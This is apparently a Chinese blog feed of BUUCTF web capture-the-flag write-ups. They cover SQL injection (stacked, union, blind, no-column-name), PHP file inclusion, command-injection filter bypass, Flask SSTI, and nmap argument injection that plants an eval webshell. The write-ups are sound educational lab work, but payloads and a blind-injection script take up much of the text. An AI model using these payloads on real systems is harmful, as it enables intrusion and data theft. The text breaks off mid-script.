class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//mb_strpos()查找 string 在一个 string 中首次出现的位置。</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//假设我们的page是123.php，最后通过mb_substr截取的内容即为123.php</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">//这边进行弱类型比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>打开hint.php，看到flag在ffffllllaaaagggg，如何打开呢？<br>将代码放到phpstorm审计一下：</p>
<p>代码中有一个include文件包含函数，我们需要让判断进入到这个语句当中，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315010417.png" alt="img" style="zoom:50%;">

<p>本来以这题是in_array绕过，但是发现，in_array的弱类型比较中，只有当haystack为数字时，needle才会自动被转化为数字，实现绕过。但是这里比较的对象为字符，弱类型比较在这里就行不通。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315210207.png" alt="img"><br>往下看 使用了一个mb_substr的函数（由于配置使用mb函数，所以这里改为substr效果一样），我们会发现下面in_array比较的对象变成是？前面的内容，然后这里返回的是true不是$_page的值，也就是说我们可以在?号后面拼接一个文件名<br>回到题目拼接试试：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315211025.png" alt="img" style="zoom:67%;">
这题出乎意料的挺简单的。。。后面的urldecode完全没用到。。。
下一题吧

<h2 id="EASYSQL"><a href="#EASYSQL" class="headerlink" title="EASYSQL"></a>EASYSQL</h2><p>admin’or 1=1#即可</p>
<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>1<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315211750.png" alt="img" style="zoom:67%;"><br>有注入点，看了一下源码，说sqlmap没有灵魂– 说明可以用sqlmap扫出来，那就等一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315212116.png" alt="img" style="zoom:67%;"><br>这里过滤了select 意味着基本上所有注入语句都用不了，尝试使用堆叠注入，（好久没用了），因为堆叠注入可以不使用select 直接 用 use show之类的指令<br>查了一下，<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;use supersqli;show tables;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;use supersqli;show columns from &#96;1919810931114514&#96;;</span><br></pre></td></tr></table></figure>

<p>这里一开始直接查询查询不出来，看了wp，发现需要加了反引号以后才可以查询，在mysql中尝试了一下，发现这个1919810931114514是一个关键字，所以需要加``<br>参考:<a href="https://www.cnblogs.com/yangzailu/p/6694000.html">https://www.cnblogs.com/yangzailu/p/6694000.html</a><br>接下来继续往下:</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315214347.png" alt="img" style="zoom:67%;">
发现flag，如何查询列名呢？：
这里找到一种方法:
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210315214932.png" alt="img" style="zoom:50%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>这个方法很巧妙啊，首先使用concat拼接语句，这样绕过select的检查，然后 set一个（这里就叫变量吧，比较好理解）储存其中 接下来使用prepare预处理 最后使用execute执行<br>参考<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a><br>参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/execute.html">https://dev.mysql.com/doc/refman/8.0/en/execute.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;47b4a012-1ccf-42b7-865d-529d431e6676&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">            echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>额直接?cat=dog就出来了。。。<br>FLAG_TABLE</p>
<h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>依旧是堆叠注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show databases;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;use ctf;show columns;</span><br></pre></td></tr></table></figure>

<p>有一个ctf接下来不管用什么语句都过不去了，于是看了一下wp，发现是有源码的，但是我扫了以后发现是没有内容的？于是看到源码中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>这里使用mysql进行测试一下:<br>这里的||是表示或 所以我们其实可以这么看这个语句:<br>我们查询FLag表内的内容可以是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from FLag</span><br></pre></td></tr></table></figure>

<p>所以我们可以用个，进行分割表示select两段内容:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210316003850.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210316003841.png" alt="img" style="zoom:67%;">
可以发现 这里的||和&&成了运算符连接了我们不需要的内容，构成一个整体代入查询展示：
**解法二（官方解法）**
有一个设置，可以将||管道符变成连接符而不是运算符Oracle 在缺省情况下支持使用 `" || "`连接字符串 ， **但是在MySQL中缺省不支持** ，MySQL 缺省使用 CONCAT 系列函数来连接字符串 .

<p>可以通过修改 sql_mode 模式 : <strong>PIPES_AS_CONCAT</strong> 来实现将 <code>&quot; || &quot;</code>视为 <strong>字符串连接符</strong> 而非 <strong>或</strong> 运算符 .</p>
<p>因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag ，如下</p>
<p><strong>Payload : <code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></strong></p>
<p>拼接后就变成了 <strong><code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210316004212.png" alt="img" style="zoom:67%;"></p>
<h2 id="include1"><a href="#include1" class="headerlink" title="include1"></a>include1</h2><p>文件包含+封装协议，之前写过了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<h2 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h2><p>1<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210316005804.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>依旧使用php://filter封装协议。。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<?php
echo "Can you find out the flag?";
flag{b870eb6c-a78c-47b5-8b1b-8f8ecbe466ac}

## lovesql

flag{81d43c03-86e1-4a93-9e26-8124c9d10632}

这题报错注入

## Ping ping ping

命令注入，过滤挺多东西，比如说空格 flag等等 查查如何bypass：
https://xz.aliyun.com/t/3918
但是过滤了flag 再看看index.php的过滤内容
使用命令：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;cat$IFS\index.php</span><br></pre></td></tr></table>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

使用base64进制绕过试试bash被禁了

试了很多种绕过但是都不行，猜测是要拼接法，但是不知道拼接语句，看了一下wp，发现自己忘记一种拼接方式了:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;a&#x3D;lag.php;cat$IFS\f$a</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;020f69e9-f457-41a0-af71-e45666a2853a&#125;</span><br></pre></td></tr></table></figure>

## exec

穿梭一下目录
发现 flag在../../../中

cat一下就行

这几题都还挺简单的。。。。决定往后看看明天再写吧]]></content>
  </entry>
  <entry>
    <title>buuctf10</title>
    <url>/2021/04/15/buuctf10/</url>
    <content><![CDATA[<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>python ssti注入 过滤()还有config以及self，由于过滤了括号，所以刚学的设置变量的方法在这里就不能使用了，看一下别人wp的思路吧:<br>app.config[‘FLAG’] = os.environ.pop(‘FLAG’) 首先这里说flag在config这个文件里面，那么如何查看这个<strong>变量</strong>呢？<br>这里介绍两个函数:<br><code>url_for</code>和<code>get_flashed_message</code>通过这两个函数，来查询现在<code>app</code>内的全局变量。(<code>get_flashed_messages</code>函数返回之前在Flask中通过<code>flash()</code>传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<code>get_flashed_messages()</code>方法取出，闪现信息只能取出一次，取出后闪现信息会被清空。)</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。<br>该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<strong>globals</strong>属性访问全局的变量。该属性保存的是函数全局变量的<strong>字典</strong>引用。</p>
<p>有了这两个知识点 我们就可以构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_message.__globals__.&#125;&#125;&#x2F;&#x2F;&#39;current_app&#39;: &lt;Flask &#39;app&#39;&gt;,</span><br><span class="line">&#123;&#123;get_flashed_message.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210415214831.png" alt="img"></p>
<p>需要注意的是 当你使用了get_flashed_message以后 查询出一次将不会再查询出第二次了</p>
<h3 id="思路小结"><a href="#思路小结" class="headerlink" title="思路小结:"></a>思路小结:</h3><p>查看源码，发现flag在app的config的配置文件中——思考如何在()被过滤的情况下获取flag变量——globals可以获得所有变量——如何读取？——寻找可读取变量的函数。</p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210416002325.png" alt="img" style="zoom:67%;">
存在sql注入 不过是MariaDB数据库而不是mysql数据库，测试了一下发现空格被过滤 使用/**/进行绕过

<p>并且union select没被过滤所以使用联合注入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210416132359.png" alt="img" style="zoom:67%;">
查询得到数据库名
由于or被过滤，所以这里学习一下

<h4 id="查询表的库总结"><a href="#查询表的库总结" class="headerlink" title="查询表的库总结"></a>查询表的库总结</h4><p>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS、sys.schema_auto_increment_columns、mysel.innodb_table_stats记录着表结构<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210417153645.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210417153648.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210417153651.png" alt="img" style="zoom:67%;"></p>
<p>本题查询表的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>ads,users</p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入:"></a>无列名注入:</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210417160615.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210417162054.png" alt="img" style="zoom:67%;">

<p>PS:为啥后面有个a呢？因为，进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名</p>
<p>把MySQL语句改成：select * from (select * from ……) as 别名; as可以省略:<br>所以此时我们就可进行无列明注入了:<br>本题payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>2,flag,admin,admin1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>这里我们是定义了表为b 并且将后面的查询到的数据暂时存入该表中</p>
<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>robots.txt里面发现一个fakeflag，然后打开包发现fl4g.php打开发现源码<br>Look_at_me: /fl4g.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;level 1</span><br><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line">if (isset($_GET[&#39;md5&#39;]))&#123;</span><br><span class="line">   $md5&#x3D;$_GET[&#39;md5&#39;];</span><br><span class="line">   if ($md5&#x3D;&#x3D;md5($md5))</span><br><span class="line">       echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get flag</span><br><span class="line">if (isset($_GET[&#39;get_flag&#39;]))&#123;</span><br><span class="line">    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;蹇埌闈炴床浜�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fl4g.php?num&#x3D;0x1234&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<p>不能使用cat，用more代替 不能使用空格，可以用之前用到的$IFS$9代替 先使用ls命令查到flag的位置</p>
<p><strong>众所周知linux中命令cat、more、less均可用来查看文件内容，主要区别有：</strong>新学的知识点<br>cat是一次性显示整个文件的内容，还可以将多个文件连接起来显示，它常与重定向符号配合使用，适用于文件内容少的情况；<br>more和less一般用于显示文件内容超过一屏的内容，并且提供翻页的功能。more比cat强大，提供分页显示的功能，less比more更强大，提供翻页，跳转，查找等命令。而且more和less都支持：用空格显示下一页，按键b显示上一页。下面详细介绍这3个命令。<br><a href="https://blog.csdn.net/xyw_blog/article/details/16861681">https://blog.csdn.net/xyw_blog/article/details/16861681</a></p>
]]></content>
  </entry>
  <entry>
    <title>buuctf11</title>
    <url>/2021/04/17/buuctf11/</url>
    <content><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>本题应该考察nmap的指令参数注入，记得之前有做个类似的题目:<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host&#x3D;&#39;&lt;?&#x3D;eval($_GET[a]);?&gt; -oN flag.phtml &#39;</span><br><span class="line">&#39; -iL &#x2F;flag -oN flag.txt &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>源码有个/flag.php 然后点进去看到说什么保存了购买者的ip，如果是购买者才能买，那就伪造一下IP，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>盲注^符号进行绕过<br>学习一下二分法进行盲注，所以直接用网上大神的脚本了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;bdd17c66-2f39-4c33-849e-abc1d04f19f2.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(i, j):</span><br><span class="line">    # 数据库名字</span><br><span class="line">    #sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 列名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 查询flag</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;: sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url, params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        print(i, &#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high:</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span 